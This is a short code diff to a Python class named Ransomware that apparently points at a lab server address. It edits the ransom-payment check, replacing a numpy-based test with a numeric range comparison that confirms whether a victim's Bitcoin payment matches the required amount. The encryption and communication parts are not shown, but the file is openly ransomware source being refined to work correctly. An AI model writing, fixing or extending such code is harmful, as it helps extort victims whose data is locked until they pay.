@@ -12,7 +12,6 @@ import rsa
 import requests
 import re
 import tempfile
-import numpy as np
 
 class Ransomware: 
     SERVER_IP = "10.0.2.5"
@@ -123,9 +122,9 @@ class Ransomware:
         
         print("balance changed by: " + str(change))
         print("Required change: " + str(bitcoin_needed))
-        print(change in np.arange(float(bitcoin_needed) - 0.0001, float(bitcoin_needed) + 0.0001))
+        print(change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001)
 
-        if (change in np.arange(float(bitcoin_needed) - 0.0001, float(bitcoin_needed) + 0.0001)):
+        if (change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001):
             return True
         else:
             global initial_balance
